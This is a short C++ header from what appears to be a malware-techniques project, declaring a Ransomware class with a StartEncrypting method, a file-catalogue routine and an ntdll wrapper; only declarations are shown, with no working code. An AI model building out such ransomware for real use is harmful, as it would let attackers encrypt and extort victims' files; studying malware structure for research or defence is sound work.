#pragma once

#include "../MalwareTechniques/ntdll.h"

#include <Windows.h>

#include <string_view>

namespace maltech {

    namespace ransom {

        class Ransomware {
        public:
            Ransomware(ntdll::NtDll& ntdll);

            void StartEncrypting();

        private:
            ntdll::NtDll& ntdll_;

            void PrintCatalogue(std::string_view path);
        };

    }

}